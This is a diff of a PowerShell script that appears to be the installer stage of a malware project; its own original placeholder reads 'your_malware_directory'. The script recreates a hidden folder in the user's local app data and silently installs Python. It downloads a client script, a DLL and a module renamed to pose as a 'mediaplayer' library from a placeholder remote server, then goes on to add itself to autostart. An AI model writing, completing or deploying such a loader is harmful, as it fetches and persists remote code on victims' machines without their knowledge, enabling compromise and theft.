@@ -1,6 +1,6 @@
 # --- Set up environment 
-$dir = "$env:localappdata\.your_malware_directory"
-$python = "$env:localappdata\Programs\Python\Python312"
+$dir = "$env:localappdata\.hephaestus"
+$python = "$env:localappdata\Programs\Python\Python313"
 
 Get-ChildItem -Path $dir -Recurse | Remove-Item -Force -Recurse
 
@@ -11,7 +11,7 @@ if (-not (Test-Path -Path $dir)) {
 
 # --- Install python if not installed
 if (-not (Test-Path -Path "$python")) {
-  $pythonVersion = "3.12.8"
+  $pythonVersion = "3.13.3"
   $installerName = "python-$pythonVersion-amd64.exe"
   $pythonInstallerUrl = "https://www.python.org/ftp/python/$pythonVersion/$installerName"
   $installerPath = "$env:TEMP\$installerName"
@@ -26,9 +26,9 @@ if (-not (Test-Path -Path "$python")) {
 # --- Download required files
 $url = "https://your_server.com"
 
-iwr "$url/api/static/client.pyw" -OutFile "$dir\client.pyw"
-iwr "$url/api/static/module.pyd" -OutFile "$dir\mediaplayer.cp312-win_amd64.pyd"
-iwr "$url/api/static/client.dll" -OutFile "$dir\core.dll"
+Invoke-WebRequest "$url/api/static/client.pyw" -OutFile "$dir\client.pyw"
+Invoke-WebRequest "$url/api/static/module.pyd" -OutFile "$dir\mediaplayer.cp313-win_amd64.pyd"
+Invoke-WebRequest "$url/api/static/client.dll" -OutFile "$dir\core.dll"
 
 
 # --- Add file to autostart and start a python process
